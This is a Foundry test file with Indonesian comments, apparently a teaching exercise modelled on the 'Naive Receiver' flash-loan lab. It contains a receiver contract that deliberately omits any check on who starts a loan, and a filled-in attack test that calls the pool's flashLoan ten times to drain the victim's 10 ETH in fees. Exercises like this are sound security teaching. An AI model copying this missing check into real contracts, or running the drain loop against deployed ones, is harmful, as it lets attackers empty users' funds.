// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// 1. THE POOL (Bank Pemberi Pinjaman)
contract NaiveReceiverLenderPool {
    uint256 public constant FIXED_FEE = 1 ether; // Biaya mahal!

    function flashLoan(address receiver, uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        
        // Cek apakah saldo bank cukup buat dipinjam
        require(balanceBefore >= amount, "Not enough ETH in pool");

        // Panggil fungsi di kontrak Receiver (Korban)
        // Kita kirim uang pinjaman ke dia
        // Dan kita harapkan dia mengembalikan uang + FEE
        (bool success, ) = receiver.call{value: amount}(
            abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE)
        );
        require(success, "External call failed");

        // Cek apakah uang sudah balik + Fee
        require(address(this).balance >= balanceBefore + FIXED_FEE, "Flash loan hasn't been paid back");
    }

    // Biar bank bisa terima deposit
    receive() external payable {}
}

// 2. THE VICTIM (Si Polos)
contract FlashLoanReceiver {
    address payable private pool;

    constructor(address payable _pool) {
        pool = _pool;
    }

    // Fungsi ini dipanggil otomatis oleh Pool saat flash loan cair
    function receiveEther(uint256 fee) public payable {
        // Cek 1: Apakah yang manggil beneran Pool? (Aman)
        require(msg.sender == pool, "Sender must be pool");

        // Cek 2: Siapa yang menginisiasi pinjaman ini?
        // ❌ BUG: GAK ADA PENGECEKAN! 
        // Dia gak peduli siapa yang nyuruh (tx.origin atau initiator).
        
        uint256 amountToBeRepaid = msg.value + fee;
        require(address(this).balance >= amountToBeRepaid, "Cannot repay loan");

        // Bayar balik ke Pool
        (bool success, ) = pool.call{value: amountToBeRepaid}("");
        require(success, "Failed to send Ether");
    }

    // Biar korban bisa diisi saldo awal
    receive() external payable {}
}

// 3. THE ATTACK SCRIPT
contract NaiveReceiverTest is Test {
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver victim;

    function setUp() public {
        pool = new NaiveReceiverLenderPool();
        victim = new FlashLoanReceiver(payable(address(pool)));

        // Setup Saldo
        vm.deal(address(pool), 1000 ether); // Bank kaya raya
        vm.deal(address(victim), 10 ether); // Korban punya 10 ETH
    }

    function test_NaiveReceiver_Attack() public {
        console.log("--- BEFORE ATTACK ---");
        console.log("Victim Balance:", address(victim).balance / 1 ether, "ETH");
        console.log("Pool Balance:  ", address(pool).balance / 1 ether, "ETH");

        // -----------------------------------------------------
        // TUGASMU: HABISKAN UANG KORBAN!
        // Korban punya 10 ETH.
        // Sekali pinjam, korban kena fee 1 ETH.
        // Berarti kamu harus meminjamkan uang ke korban sebanyak 10 kali.
        //
        // Gunakan LOOP (for/while) biar efisien.
        // panggil: pool.flashLoan(address(victim), 0);
        // (Pinjam 0 juga gak masalah, yang penting kena fee!)
        // -----------------------------------------------------
        
        // Tulis kodemu di sini:
       for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(address(victim), 0);
        }

        // -----------------------------------------------------

        console.log("--- AFTER ATTACK ---");
        console.log("Victim Balance:", address(victim).balance / 1 ether, "ETH");
        console.log("Pool Balance:  ", address(pool).balance / 1 ether, "ETH");

        // VERIFIKASI: Korban harus miskin (0 ETH)
        assertEq(address(victim).balance, 0);
        // VERIFIKASI: Bank makin kaya (1000 + 10 ETH)
        assertEq(address(pool).balance, 1010 ether);
    }
}